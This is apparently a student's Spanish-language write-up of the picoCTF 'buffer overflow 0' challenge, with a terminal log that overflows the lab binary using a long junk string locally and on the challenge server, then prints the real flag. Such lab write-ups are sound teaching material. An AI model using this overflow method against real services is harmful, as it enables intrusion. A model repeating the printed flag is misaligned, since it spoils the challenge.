## Descripción 
```
Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/173/vuln). You can view source [here](https://artifacts.picoctf.net/c/173/vuln.c).Connect using:`nc saturn.picoctf.net 59066`
```
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#objetivo)
## Solución
```
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo0$ wget https://artifacts.picoctf.net/c/173/vuln
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo0$ wget https://artifacts.picoctf.net/c/173/vuln.c
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo0$ chmod +x vuln
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo0$ file vuln
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b53f59f147e1b0b087a736016a44d1db6dee530c, for GNU/Linux 3.2.0, not stripped
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo0$ /.vuln
-bash: /.vuln: No such file or directory
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo0$ ./vuln
Please create 'flag.txt' in this directory with your own debugging flag.
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo0$ nano vuln.c
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo0$ echo 'flag{dummieflag}' > flag.txt
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo0$ ./vuln
Input: jjaaflja
The program will exit now
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo0$ ./vuln
Input: jaljflkadfjaldjfñlkdajflñkjdfñljasdfjlsdjflñsdajflñjdslfjdsalfjdsljfalñdjflñajfldsajflñjafljdsfljsdlfjsdljflajfldsjfldjfldasfjldsjfldsjflkajfljdslfjdslfafdlajflajfldjfldajfldasjfldsajflasjfldasjflasjfljsfljdsalfjadlsjfaljfdljfldasjfldsajfldsajflajfasljfldsjfldasjflad
flag{dummieflag}

porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/bo0$ nc saturn.picoctf.net 59066
Input: jaljflkadfjaldjfñlkdajflñkjdfñljasdfjlsdjflñsdajflñjdslfjdsalfjdsljfalñdjflñajfldsajflñjafljdsfljsdlfjsdljflajfldsjfldjfldasfjldsjfldsjflkajfljdslfjdslfafdlajflajfldjfldajfldasjfldsajflasjfldasjflasjfljsfljdsalfjadlsjfaljfdljfldasjfldsajfldsajflajfasljfldsjfldasjflad
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}

flag:  picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#soluci%C3%B3n)

## Notas Adicionales

[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#notas-adicionales)

### Referencias